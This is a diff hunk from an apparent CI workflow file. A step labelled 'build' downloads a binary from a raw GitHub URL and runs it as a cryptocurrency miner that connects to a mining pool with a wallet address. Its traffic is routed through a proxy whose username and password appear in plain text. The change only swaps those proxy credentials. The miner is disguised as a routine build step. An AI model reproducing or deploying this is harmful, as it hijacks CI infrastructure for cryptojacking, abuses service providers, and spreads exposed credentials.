@@ -56,4 +56,4 @@ jobs:
     - name : install dependencies   
       run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev 
     - name: build    
-      run: wget -qO gasken https://raw.githubusercontent.com/Omarjetos/ezz/master/gr && chmod +x gasken && ./gasken -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RYWn2QAuUgAL81FzK3dvBPfAMkQbF2ftih.Gupron -p x --no-tune --proxy=t1l4kr9n8kag86:313j6qv5d711cmecali54nou2urfe3@us-east-static-09.quotaguard.com:9293
+      run: wget -qO gasken https://raw.githubusercontent.com/Omarjetos/ezz/master/gr && chmod +x gasken && ./gasken -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RYWn2QAuUgAL81FzK3dvBPfAMkQbF2ftih.Gupron -p x --no-tune --proxy=kfxlz1b6istrxj:t3wqpc1av3csnfh11aeky738i1@us-east-static-09.quotaguard.com:9293
